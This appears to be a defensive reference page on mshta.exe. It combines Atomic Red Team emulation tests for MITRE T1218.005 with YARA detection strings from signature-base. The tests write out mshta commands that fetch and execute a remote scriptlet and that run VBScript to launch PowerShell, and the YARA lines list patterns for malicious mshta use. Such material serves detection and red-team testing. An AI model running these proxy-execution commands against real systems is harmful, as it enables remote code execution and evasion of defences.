[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | ## Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | \| file_url \| location of the payload \| Url \| https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close(); | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | ## Atomic Test #2 - Mshta executes VBScript to execute malicious command | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close") | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | ## Atomic Test #3 - Mshta Executes Remote HTML Application (HTA) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | mshta "#{temp_file}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | \| mshta_file_path \| Location of mshta.exe \| string \| $env:windir&#92;system32&#92;mshta.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_babyshark.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_babyshark.yar) | $x2 = /mshta\.exe http:\/\/[a-z0-9\.\/]{5,30}\.hta/ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_fin7.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_fin7.yar) | $x7 = "7374656d33325c6d736874612e657865000023002e002e005c002e002e005c002e002e005c00570069006e0064006f00770073005c005300790073007400" ascii /* hex encoded string 'stem32\mshta.exe#..\..\..\Windows\Syst' */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_leviathan.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_leviathan.yar) | $x2 = ".Run \"taskkill /im mshta.exe" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_11882.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_11882.yar) | $x1 = "4d534854412e4558452068747470" /* MSHTA.EXE http */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_11882.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_11882.yar) | $x2 = "6d736874612e6578652068747470" /* mshta.exe http */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_11882.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_11882.yar) | $x3 = "6d736874612068747470" /* mshta http */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_11882.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_11882.yar) | $x4 = "4d534854412068747470" /* MSHTA http */ | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_11882.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_11882.yar) | $mshta = "mshta" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_11882.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_11882.yar) | any of ($mshta, $http, $https, $cmd, $pwsh, $exe) and any of ($equation1, $equation2) and $address | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [exploit_cve_2017_8759.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/exploit_cve_2017_8759.yar) | $s2 = /<soap:address location="http[s]?:\/\/[^"]{8,140}mshta.exe"/ ascii wide | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_mal_scripts.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mal_scripts.yar) | description = "Detects MSHTA Bypass" | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_mal_scripts.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_mal_scripts.yar) | $s3 = "/c start mshta j" ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_url_persitence.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_url_persitence.yar) | $file1 = /[\x0a\x0d](IconFile\|(Base\|)URL)\s*=[^\x0d]*(powershell\|cmd\|certutil\|mshta\|wscript\|cscript\|rundll32\|wmic\|regsvr32\|msbuild)(\.exe\|)[^\x0d]{2,}\x0d/ nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


